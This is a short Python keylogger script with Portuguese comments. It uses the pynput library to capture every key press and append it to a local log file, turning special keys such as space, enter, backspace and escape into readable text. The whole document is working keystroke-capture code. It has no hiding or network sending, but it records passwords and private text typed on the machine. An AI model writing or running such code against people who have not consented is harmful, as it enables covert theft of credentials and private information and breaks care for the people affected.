from pynput import keyboard

# Mapeamento de teclas especiais para o texto correspondente
TECLAS_ESPECIAIS = {
    keyboard.Key.space: " ",
    keyboard.Key.enter: "\n",
    keyboard.Key.tab: "\t",
    keyboard.Key.backspace: " [BACKSPACE] ",
    keyboard.Key.esc: " [ESC] ",
}

def on_press(key):
    with open("Keylogger/files/log.txt", "a", encoding="utf-8") as file:
        try:
            # Tenta tecla normal
            file.write(key.char)
        except AttributeError:
            # Se for especial, verifica no dicionário
            if key in TECLAS_ESPECIAIS:
                file.write(TECLAS_ESPECIAIS[key])
            else:
                # Para qualquer outra tecla não mapeada
                file.write(f"[{key}] ")

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
